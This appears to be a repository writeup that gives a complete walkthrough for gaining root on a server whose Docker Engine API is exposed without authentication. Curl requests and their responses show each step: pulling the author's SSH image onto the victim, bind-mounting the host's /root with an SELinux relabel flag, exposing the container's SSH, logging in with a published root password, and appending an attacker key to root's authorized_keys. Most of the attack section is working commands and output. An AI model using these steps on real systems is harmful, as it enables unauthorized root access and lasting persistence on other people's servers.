
# Docker API Privilege Escalation
***

This document has the objective to explain a simple way to remotely make a privilege escalation in a Docker, using it's own Engine API service. 

During my analisys routine I manage to successfully make an attack, so I decided to share freely. 

I`ve made an image available containing a SSH service enabled in the  [Docker Hub](https://hub.docker.com/r/pype/privsshd/) to help in the attack (The image available it's huge, more than 200MB because of the Ubuntu base image. As soon as possible I will made available a smaller image).

PS: This attack explore a option available in the docker, without the need to utilize memory exploitation or similar way (As usually used to escape the container).
**PS2: This is only ONE of many ways to explore an server utilizing the docker API service.** If during my analysis I find others explore methods, I will post in this repository.

Any suggestions to improve the attack or to protect yourself, I'm available to listen to all of it and add to this document if appropriate.


## Engine API

*"The Engine API is an HTTP API served by Docker Engine. It is the API the Docker client uses to communicate with the Engine, so everything the Docker client can do can be done with the API."*

**By default this service don't use any authentication**, but this resource it's made available by the platform.

- [Docker Engine API](https://docs.docker.com/engine/api/v1.32/)
- [Authentication](https://docs.docker.com/engine/api/v1.32/#section/Authentication)

During the attack, we are going to utilize the parameters provided by the platform so this way we can explore the system and obtain privileged internal access.

## Exploitation
The main focus of the attack it's to be able to inject our public key inside the file *"authorized_keys"* from the root user in the server!


The exploration consist in six parts:

1. **Push the image in server**
2. **Configure a container with our image**
3. **Start the container**
4. **Connect to container SSH**
5. **Import public key in .ssh/authorized_keys in root directory**
6. **Finaly connect to SSH server with root access**

***

* **Push image in server**

The selected image for the attack need to have some kind the shell remote service available in the start, so this way we can connect to the container inside the server.

```bash
curl -XPOST "http://victim/images/create?fromImage=pype/privsshd"

< HTTP/1.1 200 OK
< Content-Type: application/json
< Server: Docker/1.12.6 (linux)
< Date: Sat, 06 Jan 2018 15:41:46 GMT
< Transfer-Encoding: chunked
< 
...
{"status":"Status: Image is up to date for docker.io/pype/privsshd:latest"}
```
In the example above I used the option to create an image from the official repository. There is [other methods](https://docs.docker.com/engine/api/v1.24/#32-images) to execute the same operation.

pype/privsshd -  The Image that I've made available to help in the documentation of the attack. 

* **Configure a container with our image**

For we to be able to inject our public key inside the file .ssh/authorized_key, we need access to the root directory in the Docker Server. For this we are going to utilize the option "Binds", this way we can select the volume of what is going to be shared between the server and our container. (Remember to configure the read and write option)

**SELINUX  *"Bypass"***

The Docker provides a mounting option capable of modify the SELINUX file or directory label shared with the container. With this option, it’s possible to mount privileged directory inside of our container (E.g.: /root/;/etc;/bin …).

We can send this option via API too, this way we can work around the SELINUX remotely .

 *"This affects the file or directory on the host machine itself and can have consequences outside of the scope of Docker."*

```json
"Binds":[  
      "/root/:/root/:rw,z"
      ]
``` 

Mais informações: [Configure-the-selinux-label](https://docs.docker.com/engine/admin/volumes/bind-mounts/#configure-the-selinux-label)


Supposing that our target server already has the port number 22 busy by it's own SSH service, we have to point another outgoing port for our connection with the container, we are going to configure the option "PortBindings" with "HostPort" in another port.
```json
{  
   "Image":"pype/privsshd",
   "Binds":[  
      "/root/:/root/:rw,z"
   ],
   "PortBindings":{  
      "22/tcp":[  
         {  
            "HostIp":"",
            "HostPort":"2233"
         }
      ]
   }
}
```
JSON it's the only format accepted by the platform, therefore configure the Content-Type of your requisition to this type of language.

```bash
curl -H "Content-Type: application/json" -d '{"Image":"pype/privsshd", "Binds": ["/root/:/root/:rw,z"],"PortBindings":{"22/tcp":[{"HostIp":"","HostPort":"2233"}]}}' -XPOST "http://victim/containers/create"

< HTTP/1.1 201 Created
< Content-Type: application/json
< Server: Docker/1.12.6 (linux)
< Date: Sat, 06 Jan 2018 16:03:34 GMT
< Content-Length: 90
< 
{"Id":"5a3c7f18d202f62...4789e781132495781f","Warnings":null}
```
If everything worked out, the requisition will return an ID and this will be the your container identifier 

* **Start the container**

Use the Identifier to start your container remotely.

```bash
curl -XPOST "http://victim/containers/5a3c7f18d202f62...4789e781132495781f/start" -v 

< HTTP/1.1 204 No Content
< Server: Docker/1.12.6 (linux)
< Date: Sat, 06 Jan 2018 22:29:46 GMT

```
Verify if the service was started with success in the target server.

```bash
~ » nc victim 2233
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
```

* **Connect to container SSH**

```bash
~ » ssh root@victim -p2233
root@victim password: 
root@5a3c7f18d202:~#
```

If you utilized my image **privsshd**, the root password it's: *screencast*.


* **Import public key in .ssh/authorized_keys in root directory**

Now you are free to inject your public key and...

```bash
root@5a3c7f18d202:~# ls .ssh/
authorized_keys  id_rsa  id_rsa.pub  known_hosts
root@5a3c7f18d202:~# echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD.." >> .ssh/authorized_keys
``` 
* **Finaly connect to SSH server with root access**

```bash
~ » ssh root@victim -i key.rsa
[root@docker-server ~]# id
uid=0(root) gid=0(root) groups=0(root) 
[root@docker-server ~]# docker --version
Docker version 1.12.6, build ae7d637/1.12.6
```

Now you have privileged access inside the remote server. :)

***
![](x.gif)
***
References:

http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html

https://docs.docker.com/engine/api/v1.24

https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/



